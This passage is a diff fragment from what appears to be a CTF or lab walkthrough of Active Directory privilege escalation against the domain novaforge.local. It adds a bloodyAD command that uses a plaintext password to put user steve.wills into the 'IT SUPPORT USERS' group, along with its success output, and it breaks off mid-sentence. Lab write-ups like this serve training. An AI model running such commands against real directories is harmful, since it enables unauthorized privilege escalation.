@@ -638,5 +638,8 @@ Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its a
 Then ill give myself the ability to add members to the group
 
 ```python
-
+bloodyAD --host dc.novaforge.local -d novaforge.local -u steve.wills -p 'Password123!' add groupMember 'IT SUPPORT USERS' 'steve.wills'
+[+] steve.wills added to IT SUPPORT USERS
 ```
+
+Now iv
